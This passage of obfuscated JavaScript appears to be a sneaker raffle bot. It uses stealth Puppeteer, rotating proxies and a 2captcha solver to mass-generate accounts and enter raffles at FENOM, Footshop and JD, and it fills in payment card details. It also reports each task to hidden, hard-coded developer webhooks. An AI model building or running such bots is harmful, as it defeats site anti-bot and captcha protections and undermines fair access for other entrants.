                            console['log'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x58691f['type']('input[name=\x22firstname\x22]', '' + _0x341dc1[_0x5ced76]['FirstName']), await _0x1a79bd(0x1f4), await _0x58691f['type']('input[name=\x22lastname\x22]', '' + _0x341dc1[_0x5ced76]['LastName']), await _0x1a79bd(0x1f4), await _0x58691f['type']('input[name=\x22email\x22]', '' + _0x341dc1[_0x5ced76]['Email']), await _0x1a79bd(0x1f4), await _0x58691f['type']('input[name=\x22password\x22]', '' + _0x341dc1[_0x5ced76]['Password']), await _0x1a79bd(0x258), await _0x58691f['$eval']('input[name=\x22psgdpr\x22]', _0x3325d6 => _0x3325d6['click']()), await _0x1a79bd(0x1f4), console['log'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x58691f['$eval']('#customer-form', _0x55aa36 => _0x55aa36['submit']());
                            try {
                                await _0x58691f['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x52312e = 'no', console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Account\x20' + _0x341dc1[_0x5ced76]['Email'] + '\x20Generated')), _0x496729['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x341dc1[_0x5ced76]['Email'] + ',' + _0x341dc1[_0x5ced76]['Password']);
                                try {
                                    _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x15026f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21228b(_0x1cab4c, _0x15026f['succesDEVMSG']);
                            } catch (_0x44cf4a) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x44cf4a);
                            }
                        } catch (_0xcb5006) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20' + _0xcb5006)), _0x273cf2 = '' + _0xcb5006;
                            var _0x4fb437 = await _0x550a27(_0x341dc1[_0x5ced76], _0x4e99eb, 'acc', !![], _0x273cf2);
                            _0x15026f['errorDEV'] = { 'embeds': [_0x4fb437] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x15026f['errorDEV']), await _0x21228b(_0x549818, _0x15026f['errorDEV']), _0x52312e = 'yes';
                        } finally {
                            _0x514823['close']();
                            if (_0x52312e == 'yes' && _0x5b2c59 != 0x5 && _0x273cf2 != 'Size\x20Not\x20Found') {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Task\x20' + (_0x5ced76 + 0x1) + '\x20:\x20Retrying')), _0x5ced76 = _0x5ced76 - 0x1, _0x5b2c59 = _0x5b2c59 + 0x1;
                                continue;
                            }
                            _0x52312e == 'yes' && _0x5b2c59 >= 0x5 && (_0x2e4d36(_0x341dc1[_0x5ced76], _0x4e99eb), _0x52312e = 'no', _0x5b2c59 = 0x0), console['log'](_0x223c9e() + '\x20[' + _0x4e99eb['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3069f1(_0xc1d96a, _0x1f318b, _0x307b5e) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1dbca0 = 0x0; _0x1dbca0 < _0x1f318b['length']; _0x1dbca0++) {
                        if (_0x5bb12f != 'yes')
                            var _0x5bb12f = '', _0x3eb212 = 0x0;
                        var _0x2115b8;
                        await _0x170817(_0x1f318b, _0x1dbca0), _0x219354(_0xc1d96a['name'] + '\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20/\x20' + _0x1f318b['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        const _0x540254 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5d8f7d = Math['round'](Math['random']() * (_0x307b5e['length'] - 0x1)), _0x172774 = _0x307b5e[_0x5d8f7d]['split'](':'), _0x15a112;
                        try {
                            _0x15a112 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x172774[0x0] + ':' + _0x172774[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x15a112 = await _0x198f78['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x172774[0x0] + ':' + _0x172774[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x13f45f = await _0x15a112['newPage'](), _0x2a0ddc = await _0x13f45f['target']()['createCDPSession'](), { windowId: _0x55418d } = await _0x2a0ddc['send']('Browser.getWindowForTarget');
                            await _0x13f45f['authenticate']({
                                'username': '' + _0x172774[0x2],
                                'password': '' + _0x172774[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x13f45f['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1a79bd(0xbb8), await _0x2a0ddc['send']('Browser.setWindowBounds', {
                                'windowId': _0x55418d,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1a79bd(0x1f40);
                            try {
                                await _0x13f45f['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x1a79bd(0x1388), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Logging\x20in'), await _0x13f45f['type']('input[name=\x22email\x22]', '' + _0x1f318b[_0x1dbca0]['Email']), await _0x1a79bd(0x1f4), await _0x13f45f['type']('input[name=\x22password\x22]', '' + _0x1f318b[_0x1dbca0]['Password']), await _0x1a79bd(0x258), await _0x13f45f['$eval']('#login-form', _0x524246 => _0x524246['submit']()), await _0x13f45f['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1a79bd(0x1f4), await _0x13f45f['goto']('' + _0x1f318b[_0x1dbca0]['Url']), await _0x13f45f['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1f318b[_0x1dbca0]['Size']);
                            if (_0x1f318b[_0x1dbca0]['Size'] != 'RANDOM') {
                                var _0x3699bf = '\x20' + _0x1f318b[_0x1dbca0]['Size'] + '\x20';
                                const _0x394eb3 = await _0x13f45f['$x']('//span[contains(text(),\x20' + _0x3699bf + ')]');
                                await _0x394eb3[0x0]['click']();
                            } else {
                                const _0x1a0ea4 = await _0x13f45f['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x4b646a = Math['round'](Math['random']() * (_0x1a0ea4['length'] - 0x1));
                                await _0x1a0ea4[_0x4b646a]['click']();
                            }
                            await _0x1a79bd(0x258), await _0x13f45f['click']('#cookieChoiceDismiss'), await _0x1a79bd(0x3e8), await _0x13f45f['type']('#instagram-account', '' + _0x1f318b[_0x1dbca0]['Follower']), await _0x1a79bd(0x28a), await _0x13f45f['click']('#book-btn'), await _0x1a79bd(0xbb8), await _0x13f45f['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x1a79bd(0x1f4), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20' + _0x41d282['cyan']('Solving\x20Captcha')), await _0x13f45f['solveRecaptchas'](), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1a79bd(0x7d0), await _0x13f45f['$eval']('#book-btn-for-sure', _0xd86488 => _0xd86488['click']()), await _0x1a79bd(0x12c), await _0x13f45f['click']('#book-btn-for-sure'), await _0x1a79bd(0xdac);
                            const _0xae716a = await _0x13f45f['$eval']('.reservation-popup\x20>\x20.title', _0x48bc9a => {
                                return _0x48bc9a['innerHTML'];
                            });
                            if (_0xae716a) {
                                _0x5bb12f = 'no', _0x4c6d06(_0x1f318b[_0x1dbca0], _0xc1d96a), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x51248b = await _0x550a27(_0x1f318b[_0x1dbca0], _0xc1d96a, 'dev', ![]), _0x18101f = await _0x550a27(_0x1f318b[_0x1dbca0], _0xc1d96a, 'pub', ![]);
                                const _0x2e5b24 = {
                                    'succesDEVMSG': { 'embeds': [_0x51248b] },
                                    'succesPUBMSG': { 'embeds': [_0x18101f] }
                                };
                                try {
                                    _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x2e5b24['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x2e5b24['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x136ee7, _0x2e5b24['succesPUBMSG']);
                                } catch (_0x25b2b5) {
                                    console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x25b2b5));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3141e7) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20' + _0x3141e7)), _0x2115b8 = '' + _0x3141e7;
                            var _0x4c3337 = await _0x550a27(_0x1f318b[_0x1dbca0], _0xc1d96a, 'dev', !![], _0x2115b8), _0x51248b = await _0x550a27(_0x1f318b[_0x1dbca0], _0xc1d96a, 'dev', ![]), _0x18101f = await _0x550a27(_0x1f318b[_0x1dbca0], _0xc1d96a, 'pub', ![]);
                            const _0x2fc7da = {
                                'succesDEVMSG': { 'embeds': [_0x51248b] },
                                'succesPUBMSG': { 'embeds': [_0x18101f] }
                            };
                            _0x2fc7da['errorDEV'] = { 'embeds': [_0x4c3337] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x2fc7da['errorDEV']), await _0x21228b(_0x549818, _0x2fc7da['errorDEV']), _0x3141e7 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5bb12f = 'yes');
                        } finally {
                            _0x15a112['close']();
                            if (_0x5bb12f == 'yes' && _0x3eb212 != 0x5 && _0x2115b8 != 'Size\x20Not\x20Found') {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Task\x20' + (_0x1dbca0 + 0x1) + '\x20:\x20Retrying')), _0x1dbca0 = _0x1dbca0 - 0x1, _0x3eb212 = _0x3eb212 + 0x1;
                                continue;
                            }
                            _0x5bb12f == 'yes' && _0x3eb212 >= 0x5 && (_0x2e4d36(_0x1f318b[_0x1dbca0], _0xc1d96a), _0x5bb12f = 'no', _0x3eb212 = 0x0), console['log'](_0x223c9e() + '\x20[' + _0xc1d96a['name'] + ']\x20Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x4f73f8, _0x2852d2, _0x5d71c9) {
                _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x37a01c['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5b9e14 = 0x0; _0x5b9e14 < _0x2852d2['length']; _0x5b9e14++) {
                    var _0x14efa8;
                    if (_0x2dfaf5 != 'yes')
                        var _0x2dfaf5 = '', _0x1abada = 0x0;
                    var _0xa19ec2 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3da10f
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2852d2[_0x5b9e14]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2852d2[_0x5b9e14]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x37a01c['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3dc3b3
                            }
                        ]
                    }], _0x265ba5 = await _0x550a27(_0x2852d2[_0x5b9e14], _0x4f73f8, 'dev', ![]), _0x8f5b5 = await _0x550a27(_0x2852d2[_0x5b9e14], _0x4f73f8, 'pub', ![]);
                    const _0x285e18 = {
                        'succesDEVMSG': { 'embeds': [_0x265ba5] },
                        'succesPUBMSG': { 'embeds': [_0x8f5b5] }
                    }, _0xc0fcc5 = { 'embeds': _0xa19ec2 };
                    await _0x170817(_0x2852d2, _0x5b9e14);
                    if (_0x2852d2[_0x5b9e14]['Email'] == '' || _0x2852d2[_0x5b9e14]['FirstName'] == '' || _0x2852d2[_0x5b9e14]['LastName'] == '' || _0x2852d2[_0x5b9e14]['Country'] == '' || _0x2852d2[_0x5b9e14]['Size'] == '' || _0x2852d2[_0x5b9e14]['Address1'] == '' || _0x2852d2[_0x5b9e14]['Zip'] == '') {
                        console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2852d2[_0x5b9e14]['Email'] == '' || _0x2852d2[_0x5b9e14]['FirstName'] == '' || _0x2852d2[_0x5b9e14]['LastName'] == '' || _0x2852d2[_0x5b9e14]['Country'] == '' || _0x2852d2[_0x5b9e14]['Size'] == '' || _0x2852d2[_0x5b9e14]['Address1'] == '' || _0x2852d2[_0x5b9e14]['Zip'] == '' || _0x2852d2[_0x5b9e14]['Phone'] == '') {
                        console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x37091b = '' + _0x2852d2[_0x5b9e14]['Url'];
                    if (_0x37a01c['useRandomProxy'] = ![])
                        var _0x14e1ed = _0x5d71c9[_0x5b9e14]['split'](':');
                    else
                        var _0x206837 = Math['round'](Math['random']() * (_0x5d71c9['length'] - 0x1)), _0x14e1ed = _0x5d71c9[_0x206837]['split'](':');
                    const _0xb73cab = await _0x198f78['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x14e1ed[0x0] + ':' + _0x14e1ed[0x1]]
                    });
                    try {
                        const _0x2293a9 = await _0xb73cab['newPage']();
                        await _0x2293a9['authenticate']({
                            'username': '' + _0x14e1ed[0x2],
                            'password': '' + _0x14e1ed[0x3]
                        }), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2293a9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2293a9['setRequestInterception'](!![]), _0x2293a9['on']('request', _0x4ab97b => {
                            _0x4ab97b['resourceType']() === 'image' || _0x4ab97b['resourceType']() === 'font' || _0x4ab97b['resourceType']() === 'media' ? _0x4ab97b['abort']() : _0x4ab97b['continue']();
                        }), await _0x2293a9['goto'](_0x37091b), await _0x1a79bd(0xbb8), await _0x2293a9['waitForSelector']('.control__JhutY'), await _0x2293a9['click']('.control__JhutY'), await _0x1a79bd(0x1f4);
                        if (_0x2852d2[_0x5b9e14]['Size'] != 'RANDOM')
                            try {
                                const _0x1720be = await _0x2293a9['$x']('//div[contains(text(),\x20\x27' + _0x2852d2[_0x5b9e14]['Size'] + '\x27)]');
                                await _0x1720be[0x0]['click']();
                            } catch {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x18c063 = await _0x2293a9['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x279018 = Math['round'](Math['random']() * (_0x18c063['length'] - 0x1));
                            await _0x18c063[_0x279018]['click']();
                        }
                        await _0x1a79bd(0x4b0);
                        const _0x18b241 = await _0x2293a9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x18b241[0x0]['click'](), await _0x2293a9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x2293a9['type']('input[name=\x22email\x22]', '' + _0x2852d2[_0x5b9e14]['Email']), await _0x1a79bd(0x640), await _0x2293a9['type']('input[name=\x22phone\x22]', '' + _0x2852d2[_0x5b9e14]['Phone']), await _0x1a79bd(0x4b0), await _0x2293a9['click']('button.btn.continue-button__1RtsS'), await _0x1a79bd(0x4b0);
                        try {
                            await _0x2293a9['type']('input[name=\x22firstName\x22]', '' + _0x2852d2[_0x5b9e14]['FirstName']), await _0x1a79bd(0x258);
                        } catch {
                            const _0x39b3a9 = await _0x2293a9['$$eval']('.invalid-feedback\x20>\x20div', _0x152b02 => {
                                return _0x152b02['map'](_0x244d18 => _0x244d18['innerText']);
                            });
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20' + _0x39b3a9));
                            continue;
                        }
                        await _0x2293a9['type']('input[name=\x22lastName\x22]', '' + _0x2852d2[_0x5b9e14]['LastName']), await _0x1a79bd(0xc8), await _0x2293a9['type']('input[name=\x22instagramUsername\x22]', '' + _0x2852d2[_0x5b9e14]['Follower']), await _0x1a79bd(0x4b0), await _0x2293a9['click']('button.btn.continue-button__1RtsS'), await _0x1a79bd(0x3e8), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x2293a9['select']('select[name=\x22country\x22]', '' + _0x2852d2[_0x5b9e14]['Country']), await _0x1a79bd(0x2bc), await _0x2293a9['type']('input[name=\x22streetName\x22]', '' + _0x2852d2[_0x5b9e14]['Address1']), await _0x1a79bd(0x258), await _0x2293a9['type']('input[name=\x22houseNumber\x22]', _0x2852d2[_0x5b9e14]['HouseNumber'] + '\x20' + _0x2852d2[_0x5b9e14]['Address2']), await _0x1a79bd(0xc8), await _0x2293a9['type']('input[name=\x22postalCode\x22]', '' + _0x2852d2[_0x5b9e14]['Zip']), await _0x1a79bd(0x1f4), await _0x2293a9['type']('input[name=\x22city\x22]', '' + _0x2852d2[_0x5b9e14]['City']), await _0x1a79bd(0x4b0), await _0x2293a9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1a79bd(0x4b0), await _0x2293a9['click']('button.btn.continue-button__1RtsS'), await _0x1a79bd(0x4b0), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x2293a9['solveRecaptchas'](), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1a79bd(0xbb8), await _0x2293a9['click']('button.btn.continue-button__1RtsS'), await _0x1a79bd(0x1388), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2293a9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2293a9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a79bd(0x4b0), await _0x2293a9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2852d2[_0x5b9e14]['CardNumber']), await _0x1a79bd(0x320), await _0x2293a9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2293a9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2852d2[_0x5b9e14]['ExpiryDate']), await _0x1a79bd(0x4b0), await _0x2293a9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2293a9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2852d2[_0x5b9e14]['CVV']), await _0x1a79bd(0x226), await _0x2293a9['type']('input[name=\x22holderName\x22]', '' + _0x2852d2[_0x5b9e14]['NameOnCard']), await _0x1a79bd(0x226), await _0x2293a9['click']('button.adyen-checkout__button'), console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x2293a9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1a79bd(0xbb8);
                        } catch (_0x5b562e) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x203DS\x20Failed')), _0x14efa8 = '3DS\x20Error\x20' + _0x5b562e;
                            var _0x1ffead = await _0x550a27(_0x2852d2[_0x5b9e14], _0x4f73f8, 'dev', !![], _0x14efa8);
                            _0x285e18['errorDEV'] = { 'embeds': [_0x1ffead] };
                            _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x285e18['errorDEV']);
                            await _0x21228b(_0x549818, _0x285e18['errorDEV']);
                            continue;
                        }
                        _0x4c6d06(_0x2852d2[_0x5b9e14], _0x4f73f8), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                            try {
                                await _0x21228b(_0x37a01c['webhook'], _0x285e18['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x285e18['succesDEVMSG']), await _0x1a79bd(0xc8);
                        try {
                            await _0x21228b(_0x136ee7, _0x285e18['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x202d92) {
                        console['log'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20' + _0x202d92), _0x14efa8 = '' + _0x202d92;
                        var _0x1ffead = await _0x550a27(_0x2852d2[_0x5b9e14], _0x4f73f8, 'dev', !![], _0x14efa8);
                        _0x285e18['errorDEV'] = { 'embeds': [_0x1ffead] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x285e18['errorDEV']), await _0x21228b(_0x549818, _0x285e18['errorDEV']), _0x2dfaf5 = 'yes';
                    } finally {
                        _0xb73cab['close']();
                        if (_0x2dfaf5 == 'yes' && _0x1abada != 0x5) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4f73f8['name'] + ']\x20Task\x20' + (_0x5b9e14 + 0x1) + '\x20:\x20Retrying')), _0x5b9e14 = _0x5b9e14 - 0x1, _0x1abada = _0x1abada + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x37a01c['footshopDelay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x53a8e4, _0x5a0756, _0x25448e) {
                var _0x12d590 = ![], _0x5345fe = ![];
                if (_0x37a01c['captchaKey'] == '' || _0x37a01c['captchaKey'] == undefined)
                    return console['log'](_0x41d282['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x37a01c['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5e52fc = 0x0; _0x5e52fc < _0x5a0756['length']; _0x5e52fc++) {
                    if (_0xa02a44 != 'yes')
                        var _0xa02a44 = '', _0x35539e = 0x0;
                    var _0x2ccf16, _0x25ba93 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5a0756[_0x5e52fc]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5a0756[_0x5e52fc]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3da10f
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x37a01c['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3dc3b3
                            }
                        ]
                    }];
                    const _0x5afbb0 = { 'embeds': _0x25ba93 };
                    _0x219354(_0x53a8e4['name'] + '\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20/\x20' + _0x5a0756['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x5a0756, _0x5e52fc);
                    var _0x4b38e7 = await _0x550a27(_0x5a0756[_0x5e52fc], _0x53a8e4, 'dev', ![]), _0x475dae = await _0x550a27(_0x5a0756[_0x5e52fc], _0x53a8e4, 'pub', ![]);
                    const _0x49e00a = {
                        'succesDEVMSG': { 'embeds': [_0x4b38e7] },
                        'succesPUBMSG': { 'embeds': [_0x475dae] }
                    };
                    if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                        try {
                            await _0x21228b(_0x37a01c['webhook'], _0x49e00a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x49e00a['succesDEVMSG']), await _0x1a79bd(0xc8);
                    try {
                        await _0x21228b(_0x136ee7, _0x49e00a['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5a0756[_0x5e52fc]['Email'] == '' || _0x5a0756[_0x5e52fc]['Url'] == '' || _0x5a0756[_0x5e52fc]['FirstName'] == '' || _0x5a0756[_0x5e52fc]['LastName'] == '') {
                        console['log'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x37a01c['useRandomProxy'] = ![])
                        var _0x1b44b8 = _0x25448e[_0x5e52fc]['split'](':');
                    else
                        var _0x54e05e = Math['round'](Math['random']() * (_0x25448e['length'] - 0x1)), _0x1b44b8 = _0x25448e[_0x54e05e]['split'](':');
                    const _0x4f2d88 = await _0x198f78['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x1b44b8[0x0] + ':' + _0x1b44b8[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x31c1b8 = await _0x4f2d88['newPage']();
                        await _0x31c1b8['authenticate']({
                            'username': '' + _0x1b44b8[0x2],
                            'password': '' + _0x1b44b8[0x3]
                        }), console['log'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31c1b8['setRequestInterception'](!![]), _0x31c1b8['on']('request', _0x14db3c => {
